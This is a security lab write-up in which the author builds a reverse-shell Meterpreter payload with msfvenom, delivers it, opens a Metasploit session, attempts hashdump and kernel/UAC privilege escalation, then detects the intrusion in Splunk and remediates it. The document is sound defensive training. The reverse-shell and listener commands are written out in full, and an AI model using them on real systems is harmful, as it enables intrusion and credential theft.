# Lab 06 — Metasploit Attack Chain and Remediation

**Date:** March 2026

**Category:** Offensive Security and Incident Response

**Difficulty:** Advanced

---

## Objective

Execute a complete attack chain against a domain-joined Windows 10 endpoint using Metasploit, from payload creation through initial access and privilege escalation attempts, observe the full attack in Splunk, then perform remediation and build a detection rule to prevent the attack from going undetected in the future.

---

## Why This Matters

Understanding how attacks work from the attacker perspective is what separates a good defender from a great one. You cannot write effective detection rules for techniques you do not understand. This lab demonstrates that real attacks leave traces at every stage and that a properly configured SIEM can capture them.

---

## Environment

| Component | Details |
|---|---|
| Attacker | Kali Linux 2025.4, IP 192.168.10.250 |
| Target | TARGET Windows 10, IP 192.168.10.100 |
| Compromised User | bdoe (standard domain user, no local admin) |
| SIEM | Splunk on Ubuntu, IP 192.168.10.10 |
| Tools | msfvenom, Metasploit Framework, Meterpreter |

---

## Attack Chain

**Phase 1: Payload Creation**

Used msfvenom on Kali to generate a malicious Windows executable with a reverse TCP Meterpreter payload:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.250 LPORT=4444 -f exe -o /home/kali/payload.exe

This creates a standard Windows .exe file that when executed establishes an encrypted reverse shell back to the attacker machine on port 4444. A reverse shell makes the victim machine initiate the outbound connection rather than the attacker connecting inward. This bypasses inbound firewall rules which typically block incoming connections but allow outgoing traffic.

**Phase 2: Delivery**

Hosted the payload on a Python HTTP server:

python3 -m http.server 8888

User bdoe on TARGET browsed to 192.168.10.250:8888 and downloaded payload.exe, simulating a user downloading a malicious file. Windows Defender detected and blocked the file. Disabled real-time protection and tamper protection on TARGET to simulate an endpoint where AV has already been evaded.

**Phase 3: Initial Access**

Set up a Metasploit listener on Kali:

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.10.250
set LPORT 4444
run

Executed payload.exe on TARGET. Meterpreter session opened. Confirmed initial access as TOM\bdoe, a standard domain user with no administrative privileges.

**Phase 4: Post-Exploitation Enumeration**

- sysinfo: confirmed TARGET, Windows 10 22H2
- getuid: confirmed running as TOM\bdoe
- ps: listed all running processes
- hashdump: attempted password hash dump, failed due to insufficient privileges

The hashdump failure is expected. bdoe is a standard user with no admin rights so credential dumping is not possible at this privilege level.

**Phase 5: Privilege Escalation Attempts**

Ran the local exploit suggester to identify potential escalation paths:

run post/multi/recon/local_exploit_suggester

Identified real vulnerabilities on the unpatched Windows 10 22H2 VM including CVE-2024-35250 (ks.sys driver vulnerability) and CVE-2023-36874. Attempted UAC bypass modules and the CVE-2024-35250 kernel driver exploit. Full SYSTEM escalation was not achieved from a standard user with no local admin rights.

Key learning: privilege escalation from a completely standard domain user with no local admin rights is significantly harder than from a user with local admin. Proper access controls directly limited the blast radius of this compromise.

---

## Detection in Splunk

**Process execution: EventCode 4688**

Searched: index=endpoint EventCode=4688 Image="*\\Downloads\\*.exe"

Found payload.exe execution recorded. Event captured the executable path, the parent process (explorer.exe meaning the user double-clicked it), the user account (bdoe), the timestamp, and the host (TARGET).

**Network connection: Sysmon EventCode 3**

Searched: index=endpoint "192.168.10.250"

Found Sysmon network connection events showing TARGET establishing a connection to 192.168.10.250 on port 4444 immediately after payload execution. This is the reverse shell callback, also called the C2 or command and control connection.

Together these two events tell the complete story. A user ran an executable from their Downloads folder and that executable immediately made an outbound connection to an external IP. That pattern is a high-confidence malware indicator.

---

## Remediation

**Step 1: Terminate malicious process**

Killed payload.exe via Task Manager on TARGET.

**Step 2: Remove the payload**

Deleted payload.exe from the Downloads folder.

**Step 3: Re-enable endpoint protection**

Re-enabled Windows Defender real-time protection and tamper protection.

**Step 4: Run full scan**

Start-MpScan -ScanType FullScan

**Step 5: Audit compromised account**

Reviewed bdoe AD account. Checked group membership for unauthorized additions, verified account status, reviewed last logon timestamps. No unauthorized changes found during the compromise window.

**Step 6: Build detection rule**

Created a Splunk alert to automatically detect this pattern in the future.

Search: index=endpoint EventCode=4688 Image="*\\Downloads\\*.exe"

Settings: Real-time, per result, High severity, adds to triggered alerts.

Any executable running directly from a Downloads folder is either unauthorized software or malware. This is a low-noise high-signal detection rule appropriate for a real environment.

---

## MITRE ATT&CK Techniques Demonstrated

| Technique | ID | Description |
|---|---|---|
| User Execution | T1204 | User ran the malicious payload |
| Command and Scripting Interpreter | T1059 | Meterpreter shell |
| Abuse Elevation Control Mechanism | T1548 | UAC bypass attempts |
| Impair Defenses | T1562 | Disabled Windows Defender |

---

## Resources

- [Metasploit Documentation](https://docs.metasploit.com)
- [MITRE ATT&CK Framework](https://attack.mitre.org)
- [NIST Incident Response Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)
